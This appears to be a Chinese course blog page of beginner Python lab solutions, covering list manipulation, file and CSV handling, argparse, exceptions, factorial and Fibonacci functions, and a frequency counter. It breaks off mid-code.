<h3 id="将字符串中的每个字符的-ASCII-码存入列表"><a href="#将字符串中的每个字符的-ASCII-码存入列表" class="headerlink" title="将字符串中的每个字符的 ASCII 码存入列表"></a>将字符串中的每个字符的 ASCII 码存入列表</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">&quot;请输入字符串：&quot;</span>)</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">ord</span>(i))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="作业-4-附加题"><a href="#作业-4-附加题" class="headerlink" title="作业 4 附加题"></a>作业 4 附加题</h2><h3 id="列表元素用特定符号连接"><a href="#列表元素用特定符号连接" class="headerlink" title="列表元素用特定符号连接"></a>列表元素用特定符号连接</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="string">&quot;字符1&quot;</span>, <span class="string">&quot;字符2&quot;</span>, <span class="string">&quot;字符3&quot;</span>, <span class="string">&quot;字符4&quot;</span>, <span class="string">&quot;字符5&quot;</span>, <span class="string">&quot;字符6&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>.join(<span class="built_in">list</span>))</span><br></pre></td></tr></table></figure></div>

<h3 id="删除列表重复元素，去重元素放到新列表"><a href="#删除列表重复元素，去重元素放到新列表" class="headerlink" title="删除列表重复元素，去重元素放到新列表"></a>删除列表重复元素，去重元素放到新列表</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">new_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> new_list:</span><br><span class="line">        new_list.append(i)</span><br><span class="line"><span class="built_in">print</span>(new_list)</span><br></pre></td></tr></table></figure></div>

<h3 id="输入多个分数存在列表，去除最高分和最低分，求平均分"><a href="#输入多个分数存在列表，去除最高分和最低分，求平均分" class="headerlink" title="输入多个分数存在列表，去除最高分和最低分，求平均分"></a>输入多个分数存在列表，去除最高分和最低分，求平均分</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">lst = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>(<span class="string">&quot;请输入数字，用空格隔开：&quot;</span>).split(<span class="string">&quot; &quot;</span>)))</span><br><span class="line">lst.sort()</span><br><span class="line">lst = lst[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">avg = <span class="built_in">sum</span>(lst) / <span class="built_in">len</span>(lst)</span><br><span class="line"><span class="built_in">print</span>(avg)</span><br></pre></td></tr></table></figure></div>

<h3 id="空列表的添加，最高最低平均，降序切片，收尾插入，后五替换，奇数删除"><a href="#空列表的添加，最高最低平均，降序切片，收尾插入，后五替换，奇数删除" class="headerlink" title="空列表的添加，最高最低平均，降序切片，收尾插入，后五替换，奇数删除"></a>空列表的添加，最高最低平均，降序切片，收尾插入，后五替换，奇数删除</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 空列表的添加，最高最低平均，降序切片，收尾插入，后五替换，奇数删除</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lst = [80, 50, 23, 61, 83, 35, 37, 51, 1, 37]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 空列表的添加</span></span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    lst.append(<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入第&#123;&#125;个成绩：&quot;</span>.<span class="built_in">format</span>(i + <span class="number">1</span>))))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;10个成绩为<span class="subst">&#123;lst&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最高最低平均</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;最高分为<span class="subst">&#123;<span class="built_in">max</span>(lst)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;最低分为<span class="subst">&#123;<span class="built_in">min</span>(lst)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;平均分为<span class="subst">&#123;<span class="built_in">sum</span>(lst) / <span class="built_in">len</span>(lst)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 降序排列</span></span><br><span class="line">lst.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;降序排列后10个成绩为<span class="subst">&#123;lst&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 前三名</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;前三名成绩为<span class="subst">&#123;lst[:<span class="number">3</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后三名</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;后三名成绩为<span class="subst">&#123;lst[-<span class="number">3</span>:]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首尾插入</span></span><br><span class="line">lst.insert(<span class="number">0</span>, <span class="number">100</span>)</span><br><span class="line">lst.append(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;插入后成绩为<span class="subst">&#123;lst&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后五替换</span></span><br><span class="line">lst[-<span class="number">5</span>:] = [<span class="number">60</span>] * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;替换后成绩为<span class="subst">&#123;lst&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 奇数删除</span></span><br><span class="line">lst = [i <span class="keyword">for</span> i <span class="keyword">in</span> lst <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;删除后成绩为<span class="subst">&#123;lst&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="横版竖版输出古诗"><a href="#横版竖版输出古诗" class="headerlink" title="横版竖版输出古诗"></a>横版竖版输出古诗</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 5.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_poem</span>(<span class="params">poem</span>):</span><br><span class="line">    <span class="comment"># 将诗句按行分割</span></span><br><span class="line">    lines = poem.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印横版</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------横版--------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印竖版</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n--------竖版--------&quot;</span>)</span><br><span class="line">    max_length = <span class="built_in">max</span>(<span class="built_in">len</span>(line) <span class="keyword">for</span> line <span class="keyword">in</span> lines)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_length):</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">reversed</span>(lines):  <span class="comment"># 顺序倒置</span></span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(line):</span><br><span class="line">                <span class="built_in">print</span>(line[i], end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  &quot;</span>, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入古诗</span></span><br><span class="line">poem = <span class="string">&quot;&quot;&quot;白日依山尽</span></span><br><span class="line"><span class="string">黄河入海流</span></span><br><span class="line"><span class="string">欲穷千里目</span></span><br><span class="line"><span class="string">更上一层楼&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">print_poem(poem)</span><br></pre></td></tr></table></figure></div>

<h2 id="实验-5-输入和输出"><a href="#实验-5-输入和输出" class="headerlink" title="实验 5 输入和输出"></a>实验 5 输入和输出</h2><h3 id="解析命令行参数"><a href="#解析命令行参数" class="headerlink" title="解析命令行参数"></a>解析命令行参数</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://www.cnblogs.com/techflow/p/13631509.html#/</span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def calculate_square_properties(side_length):</span><br><span class="line">    perimeter = 4 * side_length</span><br><span class="line">    area = side_length * side_length</span><br><span class="line">    return perimeter, area</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = argparse.ArgumentParser(description=&quot;计算正方形的周长和面积。&quot;)</span><br><span class="line">    parser.add_argument(&quot;--sidelength&quot;, type=int, default=10, help=&quot;正方形边长&quot;)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    side_length = args.sidelength</span><br><span class="line"></span><br><span class="line">    perimeter, area = calculate_square_properties(side_length)</span><br><span class="line"></span><br><span class="line">    print(f&quot;周长=&#123;perimeter&#125;, 面积=&#123;area&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<h3 id="读取文本文件"><a href="#读取文本文件" class="headerlink" title="读取文本文件"></a>读取文本文件</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;读取文件的相对路径&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;path&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;相对文件路径&quot;</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    path = args.path</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            lines = file.readlines()</span><br><span class="line">            <span class="keyword">for</span> idx, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines, start=<span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;idx&#125;</span>: <span class="subst">&#123;line.strip()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件 <span class="subst">&#123;path&#125;</span> 未找到&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;读取文件时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<h3 id="输入并格式化保存-logs"><a href="#输入并格式化保存-logs" class="headerlink" title="输入并格式化保存 logs"></a>输入并格式化保存 logs</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 阶乘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorial</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> n * factorial(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;n的值&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;n&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;n的值&quot;</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    n = args.n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;out.logs&quot;</span>, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> <span class="subst">&#123;i*<span class="number">2</span>&#125;</span> <span class="subst">&#123;factorial(i)&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;写入0-n时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="创建文本文件写入读取"><a href="#创建文本文件写入读取" class="headerlink" title="创建文本文件写入读取"></a>创建文本文件写入读取</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shige.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="built_in">print</span>(line.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shige.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(<span class="string">&quot;春晓\n春眠不觉晓，\n处处闻啼鸟。\n夜来风雨声，\n花落知多少。\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    write_file()</span><br><span class="line">    read_file()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="csv-文件读取和写入"><a href="#csv-文件读取和写入" class="headerlink" title="csv 文件读取和写入"></a>csv 文件读取和写入</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">headers = [<span class="string">&quot;学号&quot;</span>, <span class="string">&quot;姓名&quot;</span>, <span class="string">&quot;年龄&quot;</span>, <span class="string">&quot;专业&quot;</span>, <span class="string">&quot;入学成绩&quot;</span>]</span><br><span class="line">rows = [</span><br><span class="line">    (<span class="string">&quot;1001&quot;</span>, <span class="string">&quot;张三&quot;</span>, <span class="number">19</span>, <span class="string">&quot;物理学&quot;</span>, <span class="number">550</span>),</span><br><span class="line">    (<span class="string">&quot;1002&quot;</span>, <span class="string">&quot;李四&quot;</span>, <span class="number">18</span>, <span class="string">&quot;电子工程&quot;</span>, <span class="number">530</span>),</span><br><span class="line">    (<span class="string">&quot;1005&quot;</span>, <span class="string">&quot;王五&quot;</span>, <span class="number">19</span>, <span class="string">&quot;生物工程&quot;</span>, <span class="number">540</span>),</span><br><span class="line">    (<span class="string">&quot;1006&quot;</span>, <span class="string">&quot;赵四&quot;</span>, <span class="number">19</span>, <span class="string">&quot;软件工程&quot;</span>, <span class="number">530</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将数据写入CSV文件</span></span><br><span class="line">df = pd.DataFrame(rows, columns=headers)</span><br><span class="line">df.to_csv(<span class="string">&quot;data.csv&quot;</span>, index=<span class="literal">False</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取CSV文件</span></span><br><span class="line">df_read = pd.read_csv(<span class="string">&quot;data.csv&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(df_read)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="实验-6-异常处理"><a href="#实验-6-异常处理" class="headerlink" title="实验 6 异常处理"></a>实验 6 异常处理</h2><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">10</span></span><br><span class="line">    b = <span class="number">5</span></span><br><span class="line">    c = a / b</span><br><span class="line">    <span class="keyword">if</span> a &gt; b:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;a的值大于b.不符合要求&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;索引错误&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> ve:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;数值错误: <span class="subst">&#123;ve&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ArithmeticError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;算术错误&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;未知异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="实验-7-函数和函数式编程"><a href="#实验-7-函数和函数式编程" class="headerlink" title="实验 7 函数和函数式编程"></a>实验 7 函数和函数式编程</h2><h3 id="递归非递归求阶乘"><a href="#递归非递归求阶乘" class="headerlink" title="递归非递归求阶乘"></a>递归非递归求阶乘</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 递归求阶乘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fact</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> n * fact(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 非递归求阶乘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fact_iter</span>(<span class="params">n</span>):</span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">1</span>:</span><br><span class="line">        result *= n</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个整数：&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;递归求阶乘：&quot;</span>, fact(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;非递归求阶乘：&quot;</span>, fact_iter(n))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="斐波那契数列"><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a>斐波那契数列</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 求斐波那契数列</span><br><span class="line">def fib(n):</span><br><span class="line">    if n == 0:</span><br><span class="line">        return 0</span><br><span class="line">    elif n == 1:</span><br><span class="line">        return 1</span><br><span class="line">    else:</span><br><span class="line">        return fib(n - 1) + fib(n - 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 输出前20，每行10个</span><br><span class="line">for i in range(1, 21):</span><br><span class="line">    print(fib(i), end=&quot;\t&quot;)</span><br><span class="line">    if i % 10 == 0:</span><br><span class="line">        print()</span><br></pre></td></tr></table></figure></div>

<h3 id="可变参数定义"><a href="#可变参数定义" class="headerlink" title="可变参数定义"></a>可变参数定义</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#  可变参数求任意个数的最小值</span><br><span class="line">def min_n(a, b, *c):</span><br><span class="line">    return min(a, b, *c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 测试代码</span><br><span class="line">print(min_n(8, 2))</span><br><span class="line">print(min_n(16, 1, 7, 4, 15))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def analyze_sequence(seq):</span><br><span class="line">    max_value = max(seq)</span><br><span class="line">    min_value = min(seq)</span><br><span class="line">    count = len(seq)</span><br><span class="line">    return max_value, min_value, count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 测试数据</span><br><span class="line">s1 = [9, 7, 8, 3, 2, 1, 55, 6]</span><br><span class="line">s2 = [&quot;apple&quot;, &quot;pear&quot;, &quot;melon&quot;, &quot;kiwi&quot;]</span><br><span class="line">s3 = &quot;TheQuickBrownFox&quot;</span><br><span class="line"></span><br><span class="line"># 运行测试</span><br><span class="line">result1 = analyze_sequence(s1)</span><br><span class="line">result2 = analyze_sequence(s2)</span><br><span class="line">result3 = analyze_sequence(s3)</span><br><span class="line"></span><br><span class="line">print(</span><br><span class="line">    f&quot;list1 = &#123;s1&#125;\n最大值 = &#123;result1[0]&#125;, 最小值 = &#123;result1[1]&#125;, 元素个数 = &#123;result1[2]&#125;&quot;</span><br><span class="line">)</span><br><span class="line">print(</span><br><span class="line">    f&quot;list2 = &#123;s2&#125;\n最大值 = &#123;result2[0]&#125;, 最小值 = &#123;result2[1]&#125;, 元素个数 = &#123;result2[2]&#125;&quot;</span><br><span class="line">)</span><br><span class="line">print(</span><br><span class="line">    f&quot;list3 = &#123;s3&#125;\n最大值 = &#123;result3[0]&#125;, 最小值 = &#123;result3[1]&#125;, 元素个数 = &#123;result3[2]&#125;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="实验-9-附加题"><a href="#实验-9-附加题" class="headerlink" title="实验 9 附加题"></a>实验 9 附加题</h2><h3 id="奇偶判断"><a href="#奇偶判断" class="headerlink" title="奇偶判断"></a>奇偶判断</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def isOdd(num):</span><br><span class="line">    return num % 2 != 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 示例使用</span><br><span class="line">num = int(input(&quot;请输入一个整数: &quot;))</span><br><span class="line">if isOdd(num):</span><br><span class="line">    print(f&quot;&#123;num&#125; 是 奇数&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;&#123;num&#125; 是 偶数&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def factorial(n):</span><br><span class="line">    if n == 0:</span><br><span class="line">        return 1</span><br><span class="line">    result = 1</span><br><span class="line">    for i in range(1, n + 1):</span><br><span class="line">        result *= i</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    m = int(input(&quot;请输入一个整数(n&gt;=0): &quot;))</span><br><span class="line">    total_sum = 0</span><br><span class="line">    for i in range(m + 1):</span><br><span class="line">        fact = factorial(i)</span><br><span class="line">        print(f&quot;&#123;i&#125;的阶乘是&#123;fact&#125;&quot;)</span><br><span class="line">        total_sum += fact</span><br><span class="line">    print(f&quot;&lt;= &#123;m&#125;的所有数的阶乘之和为&#123;total_sum&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="找最小值"><a href="#找最小值" class="headerlink" title="找最小值"></a>找最小值</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def min_n(a, b, *c):</span><br><span class="line">    # 将所有参数放入一个列表</span><br><span class="line">    numbers = [a, b] + list(c)</span><br><span class="line">    # 找到最小值</span><br><span class="line">    min_value = min(numbers)</span><br><span class="line">    return min_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 测试代码</span><br><span class="line">print(f&quot;8, 2中最小值为 &#123;min_n(8, 2)&#125;&quot;)</span><br><span class="line">print(f&quot;16, 1, 7, 4, 15中最小值为 &#123;min_n(16, 1, 7, 4, 15)&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="列表元组"><a href="#列表元组" class="headerlink" title="列表元组"></a>列表元组</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def analyze_sequence(seq):</span><br><span class="line">    max_value = max(seq)</span><br><span class="line">    min_value = min(seq)</span><br><span class="line">    length = len(seq)</span><br><span class="line">    return max_value, min_value, length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 测试数据</span><br><span class="line">s1 = [4, 3, 5, 76, 5, 2]</span><br><span class="line">s2 = [&quot;apple&quot;, &quot;pear&quot;, &quot;banana&quot;, &quot;kiwi&quot;]</span><br><span class="line">s3 = &quot;TheQuickBrownFox&quot;</span><br><span class="line"></span><br><span class="line"># 结果</span><br><span class="line">result1 = analyze_sequence(s1)</span><br><span class="line">result2 = analyze_sequence(s2)</span><br><span class="line">result3 = analyze_sequence(s3)</span><br><span class="line"></span><br><span class="line">print(</span><br><span class="line">    f&quot;list = &#123;s1&#125;\n最大值= &#123;result1[0]&#125;，最小值= &#123;result1[1]&#125;，元素个数= &#123;result1[2]&#125;&quot;</span><br><span class="line">)</span><br><span class="line">print(</span><br><span class="line">    f&quot;list = &#123;s2&#125;\n最大值= &#123;result2[0]&#125;，最小值= &#123;result2[1]&#125;，元素个数= &#123;result2[2]&#125;&quot;</span><br><span class="line">)</span><br><span class="line">print(</span><br><span class="line">    f&quot;list = &#123;s3&#125;\n最大值= &#123;result3[0]&#125;，最小值= &#123;result3[1]&#125;，元素个数= &#123;result3[2]&#125;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="字频"><a href="#字频" class="headerlink" title="字频"></a>字频</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def count_numbers(input_string):</span><br><span class="line">    # 将输入字符串转换为列表</span><br><span class="line">    numbers = list(map(int, input_string.split(&#x27;,&#x27;)))</span><br><span class="line"></span><br><span class="line">    # 创建一个字典来统计每个数字出现的次数</span><br><span class="line">    count_dict = &#123;&#125;</span><br><span class="line">    for number in numbers:</span><br><span class="line">        if number in count_dict:</span><br><span class="line">            count_dict[number] += 1</span><br><span class="line">        else:</span><br><span class="line">            count_dict[number] = 1</span><br><span class="line"></span><br><span class="line">    # 打印统计结果</span><br><span class="line">    print(&quot;统计结果为:&quot;)</span><br><span class="line">    for number, count in count_dict.items():</span><br><span class="line">        print(f&quot;&#123;number&#125; 出现 &#123;count&#125; 次&quot;)</span><br><span 